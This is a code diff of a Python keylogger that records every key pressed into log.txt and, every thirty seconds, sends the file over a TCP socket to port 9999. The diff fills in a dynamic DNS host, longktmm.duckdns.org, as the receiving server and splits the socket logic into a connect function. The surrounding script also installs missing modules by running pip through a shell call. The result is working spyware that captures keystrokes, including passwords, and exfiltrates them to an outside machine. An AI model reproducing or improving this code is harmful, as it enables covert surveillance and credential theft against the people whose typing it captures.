@@ -9,27 +9,34 @@ except ImportError:
     call("pip install " + ' '.join(modules), shell=True)
 finally:
     from pynput import keyboard
-    from pynput.keyboard import Key,Listener
+    from pynput.keyboard import Key, Listener
 
-    machine = ""
+    machine = "longktmm.duckdns.org"
     port = 9999
 
-        
-    def sender():
+    def connect():
         try:
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client.connect((machine, port))
-            
-            with open("log.txt", 'rb') as file:
-                data = file.read(1024)
-                while data:
-                    print("Sending data")
-                    client.send(data)
-                    data = file.read(1024)
-                print("Data sent successfully")
-                client.close()
+            return client
         except Exception as e:
-            print(f"Failed to send data: {e}")
+            print(f"Failed to connect: {e}")
+            return None
+
+    def sender():
+        client = connect()
+        if client:
+            try:
+                with open("log.txt", 'rb') as file:
+                    data = file.read(1024)
+                    while data:
+                        print("Sending data")
+                        client.send(data)
+                        data = file.read(1024)
+                    print("Data sent successfully")
+                    client.close()
+            except Exception as e:
+                print(f"Failed to send data: {e}")
             
     def write_to_file(key):
         mess = ''
@@ -56,7 +63,7 @@ finally:
         with Listener(on_press=write_to_file) as l:
             try:
                 while True:
-                    time.sleep(30)   
+                    time.sleep(30)
                     sender()
             except KeyboardInterrupt:
                 pass
